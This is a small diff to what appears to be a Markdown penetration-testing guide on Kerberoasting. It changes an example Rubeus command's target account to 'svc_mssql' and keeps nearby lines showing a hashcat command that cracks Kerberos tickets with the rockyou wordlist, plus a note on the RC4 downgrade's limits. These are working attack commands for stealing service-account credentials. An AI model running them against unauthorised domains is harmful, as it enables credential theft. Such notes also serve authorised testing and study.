@@ -293,7 +293,7 @@ hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt
 Forcing RC4:
 
 ```
-.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
+.\Rubeus.exe kerberoast /user:svc_mssql /nowrap /tgtdeleg
 ```
 
 **Exception**: On **Windows Server 2019 domain controllers**, the /tgtdeleg downgrade technique generally does not work. The domain controller will return the highest encryption type supported by the account, usually AES‑256.
